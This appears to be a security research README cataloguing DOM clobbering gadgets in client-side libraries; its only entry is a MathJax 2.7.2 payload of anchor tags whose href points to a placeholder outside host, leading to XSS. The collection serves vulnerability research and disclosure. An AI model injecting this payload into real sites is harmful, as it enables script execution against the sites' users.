# DOM Clobbering Collection

In this repo, we collect a list of client-side library that are either vulnerable to html injection or contain DOM Clobbering gadgets that leading to severe consequences, e.g. XSS.


## HTML Injection


## DOM Clobbering Gadgets


| Library | Version | Payloads | Impact | Found By |
|:-------:|:-------:|----------|:------:|:--------:|
| MathJax | 2.7.2  | ```<a id="MathJax"></a> <a id="MathJax" name="root" href="https://xxx.xxx.xxx"></a>```       |    XSS    |    TheHulk      |
|         |         |          |        |          |
|         |         |          |        |          |